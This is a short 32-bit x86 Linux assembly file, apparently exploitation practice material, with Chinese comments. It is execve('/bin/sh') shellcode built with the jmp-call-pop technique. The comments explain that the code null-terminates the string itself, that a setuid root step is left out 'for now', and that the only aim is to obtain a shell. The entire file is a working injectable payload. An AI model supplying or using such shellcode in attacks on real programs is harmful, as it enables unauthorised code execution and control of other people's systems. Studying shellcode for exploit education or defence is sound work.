; section .data
; 	string db '/bin//sh'
; section .text
global _start
	_start:
		jmp two
	; setuid
	; 暂时并不需要获取 root 权限
	; xor eax, eax
	; mov al, 0d5H
	; xor ebx, ebx
	; int 80H
	; execve
	one:	
		pop ebx; get address of "/bin/sh"
		; 这里需要保证 '/bin//sh' 以 0 结尾
		; 因此需要在汇编中写入代码手动将其调整为 0
		xor eax, eax
		mov [ebx + 8], al
		mov al, 0BH
		xor ecx, ecx
		xor edx, edx
		int 80H
	; exit
	; 我们的目的是得到一个 shell , 并不关心程序是否可以正常退出
	; mov eax, 1
	; mov ebx, 0
	; int 80H
	two:
		call one ; push address of "/bin/sh", jmp one
		db '/bin//sh'
